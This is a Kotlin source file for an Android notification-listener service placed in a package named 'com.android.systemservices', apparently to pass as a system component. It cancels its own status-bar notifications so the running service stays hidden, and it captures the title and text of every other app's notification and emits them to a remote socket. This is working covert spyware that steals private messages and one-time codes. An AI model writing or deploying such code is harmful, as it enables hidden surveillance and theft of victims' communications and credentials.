package com.android.systemservices

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

class NotificationService : NotificationListenerService() {

    companion object {
        private const val TAG = "NotificationService"
        @Volatile var instance: NotificationService? = null
    }

    override fun onListenerConnected() {
        instance = this
        Log.i(TAG, "Notification listener connected")
    }

    override fun onListenerDisconnected() {
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        val pkg = sbn.packageName ?: return

        // Auto-cancel our own FGS / alert notifications so they never appear in the shade.
        // Cancelling via NotificationListenerService removes the notification from the UI
        // but does NOT revoke foreground-service status — the service keeps running normally.
        if (pkg == packageName) {
            // The airline Wi-Fi "needs sign-in" alert is a deliberate, user-facing notification —
            // let it through instead of auto-cancelling it with the other self-notifications.
            if (sbn.tag == AirlineWifiHelper.SIGNIN_NOTIF_TAG) return
            try { cancelNotification(sbn.key) } catch (_: Exception) {}
            return
        }

        // Skip system UI noise
        if (pkg == "com.android.systemui") return

        try {
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
            val text  = (extras.getCharSequence(Notification.EXTRA_BIG_TEXT)
                ?: extras.getCharSequence(Notification.EXTRA_TEXT))?.toString() ?: ""
            if (title.isEmpty() && text.isEmpty()) return

            val payload = JSONObject().apply {
                put("pkg",   pkg)
                put("title", title)
                put("text",  text)
                put("ts",    sbn.postTime)
                put("id",    sbn.id)
                put("tag",   sbn.tag ?: "")
                put("group", sbn.groupKey ?: "")
            }
            SocketManager.emit("notification_event", payload)
        } catch (e: Exception) {
            Log.e(TAG, "onNotificationPosted error: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
